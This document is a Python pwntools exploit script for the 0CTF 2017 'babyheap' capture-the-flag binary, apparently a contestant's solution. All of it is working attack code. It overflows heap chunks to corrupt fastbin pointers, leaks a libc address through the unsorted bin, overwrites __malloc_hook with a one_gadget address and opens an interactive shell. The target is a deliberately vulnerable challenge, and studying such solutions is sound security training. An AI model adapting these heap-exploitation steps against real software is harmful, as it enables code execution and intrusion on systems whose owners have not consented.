from pwn import *
context.log_level = 'debug'

#conn = remote('node4.buuoj.cn', 25222)
conn = process('./babyheap_0ctf_2017')
#gdb.attach(conn, 'b calloc')

def select(id):
    conn.sendlineafter(b'Command: ', str(id).encode())

def newchunk(size):
    select(1)
    conn.sendlineafter(b'Size: ', str(size).encode())
    conn.recvline()

def fillchunk(id,  content):
    select(2)
    conn.sendlineafter(b'Index: ', str(id).encode())
    conn.sendlineafter(b'Size: ', str(len(content)).encode())
    conn.sendlineafter(b'Content: ', content)

def freechunk(id):
    select(3)
    conn.sendlineafter(b'Index: ', str(id).encode())

def showchunk(id):
    select(4)
    conn.sendlineafter(b'Index: ', str(id).encode())
    conn.recvuntil(b'Content: \n')
    return conn.recvline()

if __name__ == "__main__":
    newchunk(0x20)  # 0
    newchunk(0x20)  # 1
    newchunk(0x20)  # 2
    newchunk(0x20)  # 3
    newchunk(0x100) # 4
    freechunk(1)
    freechunk(2)

    payload = b'a' * 0x28   # padding #0
    payload += p64(0x31) + b'\x00' * 0x28   # padding #1
    payload += p64(0x31) + b'\xc0'  # override the lowest byte of fd ptr
    fillchunk(0, payload)

    payload = b'a' * 0x28 + p64(0x31) + b'\x00' * 0x28 + p64(0xe0)
    fillchunk(3, payload)
    newchunk(0x20)  # 1
    newchunk(0x20)  # 2 has same ptr with # 4
    newchunk(0x20)  # 5

    payload = b'a' * 0x28 + p64(0x111)
    fillchunk(3, payload)
    freechunk(4)
    res = showchunk(2)
    unsorted_bin = u64(res[:6].ljust(0x8, b'\x00'))
    print(f'usorted bin: {hex(unsorted_bin)}')
    libc_base = unsorted_bin - 0x3c3b78
    #libc_base = unsorted_bin - 0x3c4b78
    malloc_hook = unsorted_bin - 0x68
    # one_gadget : 0x45206 0x4525a 0xef9f4 0xf0897
    one_gadget = libc_base + 0x4525a

    # overwrite any addr by fast-bin attack
    newchunk(0x60) # 4
    freechunk(4)
    payload = p64(malloc_hook-0x23)
    fillchunk(2, payload)
    newchunk(0x60) # 4
    newchunk(0x60)  # 6
    payload = b'a' * 0x13 + p64(one_gadget)
    fillchunk(6, payload)

    select(1)
    conn.sendlineafter(b'Size: ', str(0x100).encode())
    #conn.recv()
    conn.interactive()
